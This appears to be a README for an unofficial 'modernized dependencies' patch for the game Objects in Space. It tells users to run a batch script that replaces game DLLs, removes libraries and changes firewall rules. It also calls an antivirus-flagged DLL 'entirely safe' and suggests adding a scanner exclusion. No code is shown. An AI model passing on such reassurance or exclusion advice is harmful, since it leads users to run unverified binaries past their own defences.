# Objects in Space - Modernized 32-Bit Dependencies & Community Patch

A community-maintained package of modernized 32-bit runtime dependencies and automated deployment scripts for Objects in Space. This package addresses compatibility issues, cleans up redundant files, and introduces an optional Windows Firewall configuration to protect legacy network modules.

---

## What This Patch Does

* Updates core dependencies with stable 32-bit binary builds of essential runtime DLLs like OpenAL32.dll, glew32.dll, and fmod.dll.
* Automatically removes redundant or conflicting files, including legacy OpenSSL v3 and iconv libraries.
* Includes an opt-in automated script to restrict unnecessary inbound internet exposure for legacy networking components.

---

## Installation Instructions

1. Download the latest release or download this repository as a zip archive.
2. Extract the entire archive to a folder on your computer such as your Desktop. Do not run the script directly from inside the compressed zip file.
3. Double-click **Patch_OIS.bat**.
4. Follow the on-screen prompts:
   * The script will locate your default Steam installation of Objects in Space.
   * It will copy the required DLLs and clean up old dependencies.
   * You will be given a prompt to apply recommended Windows Firewall rules for added security.

---

## Antivirus Notes

When downloading or running community-compiled 32-bit C++ binaries, you may occasionally run into antivirus false positives:

* **libwinpthread-1.dll:** Some security engines flag this standard MinGW POSIX threading library due to generic signature heuristics. It is entirely safe and required for modern threading wrappers. If your scanner blocks it, you can add an exclusion or verify the checksums.
* **Firewall Implementation:** The batch script uses a native PowerShell process to configure the firewall without dropping temporary executable files on your system.

---

## Community and Support

If you experience game crashes, bugs, or deployment issues after applying the patch, please check the Steam Community Discussions for Objects in Space to report them or seek help from other players.
https://steamcommunity.com/app/824070/discussions/0/573795849686060451/
